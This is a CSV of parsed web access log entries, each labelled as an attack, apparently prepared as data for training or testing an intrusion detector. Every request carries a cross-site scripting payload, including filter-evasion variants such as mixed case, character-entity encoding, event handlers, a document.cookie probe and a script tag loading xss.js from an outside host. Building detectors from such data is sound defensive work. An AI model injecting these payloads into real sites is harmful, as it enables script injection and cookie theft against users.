"","ip","date","hour","minute","seconds","zone","request1","request2","status","respsize","attaque"
"34","192.108.116.88","18/Dec/2017","13","06","27","+0000","GET ","css/index.css HTTP/1.1/datalab <video/poster/onerror=alert()> ",304,NA,1
"35","192.108.116.88","18/Dec/2017","13","06","27","+0000","GET ","img/logo.png HTTP/1.1/datalab <video/poster/onerror=alert()> ",304,NA,1
"36","192.108.116.88","18/Dec/2017","13","06","45","+0000","GET "," HTTP/1.1/NA/datalab <isindex/autofocus/onfocus=alert()> ",200,1040,1
"37","192.108.116.88","18/Dec/2017","13","06","45","+0000","GET ","css/index.css HTTP/1.1/datalab <isindex/autofocus/onfocus=alert()> ",200,945,1
"38","192.108.116.88","18/Dec/2017","13","06","45","+0000","GET ","img/logo.png HTTP/1.1/datalab <isindex/autofocus/onfocus=alert()> ",200,34463,1
"39","192.108.116.88","18/Dec/2017","13","06","46","+0000","POST ","datalab HTTP/1.1/NA/datalab <isindex/autofocus/onfocus=alert()> ",200,1073,1
"40","192.108.116.88","18/Dec/2017","13","06","46","+0000","GET ","img/logo.png HTTP/1.1/datalab <isindex/autofocus/onfocus=alert()> ",304,NA,1
"41","192.108.116.88","18/Dec/2017","13","06","46","+0000","GET ","css/index.css HTTP/1.1/datalab <isindex/autofocus/onfocus=alert()> ",304,NA,1
"42","192.108.116.88","18/Dec/2017","13","07","06","+0000","GET "," HTTP/1.1/NA/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",200,1040,1
"43","192.108.116.88","18/Dec/2017","13","07","06","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",200,945,1
"44","192.108.116.88","18/Dec/2017","13","07","06","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",200,34463,1
"45","192.108.116.88","18/Dec/2017","13","07","07","+0000","POST ","datalab HTTP/1.1/NA/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",200,1073,1
"46","192.108.116.88","18/Dec/2017","13","07","07","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",304,NA,1
"47","192.108.116.88","18/Dec/2017","13","07","07","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",304,NA,1
"48","192.108.116.88","18/Dec/2017","13","07","24","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,1040,1
"49","192.108.116.88","18/Dec/2017","13","07","24","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,945,1
"50","192.108.116.88","18/Dec/2017","13","07","24","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,34463,1
"51","192.108.116.88","18/Dec/2017","13","09","24","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",NA,NA,1
"52","192.108.116.88","18/Dec/2017","13","11","25","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",NA,NA,1
"53","192.108.116.88","18/Dec/2017","13","11","47","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",200,1040,1
"54","192.108.116.88","18/Dec/2017","13","11","47","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert('XSS')> ",200,945,1
"55","192.108.116.88","18/Dec/2017","13","11","47","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert('XSS')> ",200,34463,1
"56","192.108.116.88","18/Dec/2017","13","13","47","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",NA,NA,1
"57","192.108.116.88","18/Dec/2017","13","15","48","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",NA,NA,1
"58","192.108.116.88","18/Dec/2017","13","32","21","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,1040,1
"59","192.108.116.88","18/Dec/2017","13","32","21","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,945,1
"60","192.108.116.88","18/Dec/2017","13","32","21","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""javascript:alert('XSS');""> ",200,34463,1
"61","192.108.116.88","18/Dec/2017","13","34","21","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",NA,NA,1
"62","192.108.116.88","18/Dec/2017","13","36","21","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS');""> ",NA,NA,1
"63","192.108.116.88","18/Dec/2017","13","36","46","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",200,1040,1
"64","192.108.116.88","18/Dec/2017","13","36","46","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert('XSS')> ",200,945,1
"65","192.108.116.88","18/Dec/2017","13","36","47","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert('XSS')> ",200,34463,1
"66","192.108.116.88","18/Dec/2017","13","38","46","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",NA,NA,1
"67","192.108.116.88","18/Dec/2017","13","40","46","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert('XSS')> ",NA,NA,1
"68","192.108.116.88","18/Dec/2017","13","41","11","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=JaVaScRiPt:alert('XSS')> ",200,1040,1
"69","192.108.116.88","18/Dec/2017","13","41","11","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=JaVaScRiPt:alert('XSS')> ",200,945,1
"70","192.108.116.88","18/Dec/2017","13","41","11","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=JaVaScRiPt:alert('XSS')> ",200,34463,1
"71","192.108.116.88","18/Dec/2017","13","43","11","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=JaVaScRiPt:alert('XSS')> ",NA,NA,1
"72","192.108.116.88","18/Dec/2017","13","45","11","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=JaVaScRiPt:alert('XSS')> ",NA,NA,1
"73","192.108.116.88","18/Dec/2017","13","45","26","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=javascript:alert(""XSS"")> ",200,1040,1
"74","192.108.116.88","18/Dec/2017","13","45","27","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert(""XSS"")> ",200,945,1
"75","192.108.116.88","18/Dec/2017","13","45","27","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert(""XSS"")> ",200,34463,1
"76","192.108.116.88","18/Dec/2017","13","45","28","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert(""XSS"")> ",200,1073,1
"77","192.108.116.88","18/Dec/2017","13","45","28","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert(""XSS"")> ",304,NA,1
"78","192.108.116.88","18/Dec/2017","13","45","28","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert(""XSS"")> ",304,NA,1
"79","192.108.116.88","18/Dec/2017","13","45","45","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> ",200,1040,1
"80","192.108.116.88","18/Dec/2017","13","45","45","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> ",200,945,1
"81","192.108.116.88","18/Dec/2017","13","45","45","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> ",200,34463,1
"82","192.108.116.88","18/Dec/2017","13","47","45","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> ",NA,NA,1
"83","192.108.116.88","18/Dec/2017","13","49","46","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> ",NA,NA,1
"84","192.108.116.88","18/Dec/2017","13","50","02","+0000","GET "," HTTP/1.1/NA/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",200,1040,1
"85","192.108.116.88","18/Dec/2017","13","50","02","+0000","GET ","css/index.css HTTP/1.1/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",200,945,1
"86","192.108.116.88","18/Dec/2017","13","50","02","+0000","GET ","img/logo.png HTTP/1.1/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",200,34463,1
"87","192.108.116.88","18/Dec/2017","13","50","03","+0000","POST ","datalab HTTP/1.1/NA/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",200,1073,1
"88","192.108.116.88","18/Dec/2017","13","50","03","+0000","GET ","css/index.css HTTP/1.1/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",304,NA,1
"89","192.108.116.88","18/Dec/2017","13","50","03","+0000","GET ","img/logo.png HTTP/1.1/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",304,NA,1
"90","192.108.116.88","18/Dec/2017","13","50","27","+0000","GET "," HTTP/1.1/NA/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",200,1040,1
"91","192.108.116.88","18/Dec/2017","13","50","27","+0000","GET ","css/index.css HTTP/1.1/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",200,945,1
"92","192.108.116.88","18/Dec/2017","13","50","27","+0000","GET ","img/logo.png HTTP/1.1/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",200,34463,1
"93","192.108.116.88","18/Dec/2017","13","50","28","+0000","POST ","datalab HTTP/1.1/NA/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",200,1073,1
"94","192.108.116.88","18/Dec/2017","13","50","28","+0000","GET ","css/index.css HTTP/1.1/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",304,NA,1
"95","192.108.116.88","18/Dec/2017","13","50","28","+0000","GET ","img/logo.png HTTP/1.1/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",304,NA,1
"96","192.108.116.88","18/Dec/2017","13","50","44","+0000","GET "," HTTP/1.1/NA/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",200,1040,1
"97","192.108.116.88","18/Dec/2017","13","50","44","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",200,945,1
"98","192.108.116.88","18/Dec/2017","13","50","44","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",200,34463,1
"99","192.108.116.88","18/Dec/2017","13","50","45","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",200,1073,1
"100","192.108.116.88","18/Dec/2017","13","50","45","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",304,NA,1
"101","192.108.116.88","18/Dec/2017","13","50","45","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",304,NA,1
"102","192.108.116.88","18/Dec/2017","13","51","05","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",200,1040,1
"103","192.108.116.88","18/Dec/2017","13","51","05","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",200,945,1
"104","192.108.116.88","18/Dec/2017","13","51","05","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",200,34463,1
"105","192.108.116.88","18/Dec/2017","13","51","06","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",200,1073,1
"106","192.108.116.88","18/Dec/2017","13","51","06","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",304,NA,1
"107","192.108.116.88","18/Dec/2017","13","51","06","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",304,NA,1
"108","192.108.116.88","18/Dec/2017","13","51","26","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=# onmouseover=""alert('xxs')""> ",200,1040,1
"109","192.108.116.88","18/Dec/2017","13","51","27","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=# onmouseover=""alert('xxs')""> ",200,945,1
"110","192.108.116.88","18/Dec/2017","13","51","27","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=# onmouseover=""alert('xxs')""> ",200,34463,1
"111","192.108.116.88","18/Dec/2017","13","53","27","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=# onmouseover=""alert('xxs')""> ",NA,NA,1
"112","192.108.116.88","18/Dec/2017","13","55","27","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=# onmouseover=""alert('xxs')""> ",NA,NA,1
"113","192.108.116.88","18/Dec/2017","13","55","41","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC= onmouseover=""alert('xxs')""> ",200,1040,1
"114","192.108.116.88","18/Dec/2017","13","55","41","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC= onmouseover=""alert('xxs')""> ",200,945,1
"115","192.108.116.88","18/Dec/2017","13","55","42","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC= onmouseover=""alert('xxs')""> ",200,34463,1
"116","192.108.116.88","18/Dec/2017","13","57","41","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC= onmouseover=""alert('xxs')""> ",NA,NA,1
"117","192.108.116.88","18/Dec/2017","13","59","42","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC= onmouseover=""alert('xxs')""> ",NA,NA,1
"118","192.108.116.88","18/Dec/2017","13","59","57","+0000","GET "," HTTP/1.1/NA/datalab <IMG onmouseover=""alert('xxs')""> ",200,1040,1
"119","192.108.116.88","18/Dec/2017","13","59","57","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG onmouseover=""alert('xxs')""> ",200,945,1
"120","192.108.116.88","18/Dec/2017","13","59","58","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG onmouseover=""alert('xxs')""> ",200,34463,1
"121","192.108.116.88","18/Dec/2017","14","01","57","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG onmouseover=""alert('xxs')""> ",NA,NA,1
"122","192.108.116.88","18/Dec/2017","14","03","58","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG onmouseover=""alert('xxs')""> ",NA,NA,1
"123","192.108.116.88","18/Dec/2017","14","04","14","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",200,1040,1
"124","192.108.116.88","18/Dec/2017","14","04","15","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",200,945,1
"125","192.108.116.88","18/Dec/2017","14","04","15","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",200,34463,1
"126","192.108.116.88","18/Dec/2017","14","04","15","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",200,1073,1
"127","192.108.116.88","18/Dec/2017","14","04","16","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",304,NA,1
"128","192.108.116.88","18/Dec/2017","14","04","16","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",304,NA,1
"129","192.108.116.88","18/Dec/2017","14","04","41","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",200,1040,1
"130","192.108.116.88","18/Dec/2017","14","04","41","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",200,945,1
"131","192.108.116.88","18/Dec/2017","14","04","41","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",200,34463,1
"132","192.108.116.88","18/Dec/2017","14","04","42","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",200,1073,1
"133","192.108.116.88","18/Dec/2017","14","04","42","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",304,NA,1
"134","192.108.116.88","18/Dec/2017","14","04","42","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",304,NA,1
"135","192.108.116.88","18/Dec/2017","14","04","57","+0000","GET "," HTTP/1.1/NA/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",200,1040,1
"136","192.108.116.88","18/Dec/2017","14","04","57","+0000","GET ","css/index.css HTTP/1.1/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",200,945,1
"137","192.108.116.88","18/Dec/2017","14","04","57","+0000","GET ","img/logo.png HTTP/1.1/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",200,34463,1
"138","192.108.116.88","18/Dec/2017","14","04","58","+0000","POST ","datalab HTTP/1.1/NA/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",200,1073,1
"139","192.108.116.88","18/Dec/2017","14","04","58","+0000","GET ","css/index.css HTTP/1.1/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",304,NA,1
"140","192.108.116.88","18/Dec/2017","14","04","58","+0000","GET ","img/logo.png HTTP/1.1/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",304,NA,1
"141","192.108.116.88","18/Dec/2017","14","05","17","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",200,1040,1
"142","192.108.116.88","18/Dec/2017","14","05","17","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",200,945,1
"143","192.108.116.88","18/Dec/2017","14","05","17","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",200,34463,1
"144","192.108.116.88","18/Dec/2017","14","05","18","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",200,1073,1
"145","192.108.116.88","18/Dec/2017","14","05","19","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",304,NA,1
"146","192.108.116.88","18/Dec/2017","14","05","19","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",304,NA,1
"147","192.108.116.88","18/Dec/2017","14","05","37","+0000","GET "," HTTP/1.1/NA/datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> ",200,1040,1
"148","192.108.116.88","18/Dec/2017","14","05","37","+0000","GET ","css/index.css HTTP/1.1/datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> ",200,945,1
"149","192.108.116.88","18/Dec/2017","14","05","37","+0000","GET ","img/logo.png HTTP/1.1/datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> ",200,34463,1
